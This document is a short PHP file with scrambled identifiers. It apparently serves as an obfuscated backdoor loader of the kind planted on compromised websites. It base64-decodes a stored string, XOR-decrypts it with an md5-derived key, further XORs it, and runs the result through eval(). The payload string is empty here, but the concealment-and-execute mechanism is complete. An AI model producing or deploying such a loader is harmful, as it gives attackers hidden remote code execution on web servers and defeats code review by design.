<?php
$yetf="";
function rndzvfpk($yetf, $ndzvfpk){
    $zavyswt = md5($ndzvfpk);
    $btdn = '';
	$efyzgui = '32';
    $ulacj = strlen($yetf);
    for($gixdyzw=0, $beyu=0; $gixdyzw<$ulacj; $gixdyzw++, $beyu++){
		if($beyu == $efyzgui)
			$beyu = 0;
        $btdn .= $yetf[$gixdyzw] ^ $zavyswt[$beyu];
    }
    return $btdn;
}
function xsal($yetf){
    $yetf = rndzvfpk(base64_decode($yetf),'KF'.'578@Er');
    $ulacj = strlen($yetf);
    $btdn = '';
    for($gixdyzw=0; $gixdyzw<$ulacj; $gixdyzw++){
        $btdn .= $yetf[$gixdyzw] ^ $yetf[++$gixdyzw];
    }
    eval($btdn);
}
xsal($yetf);
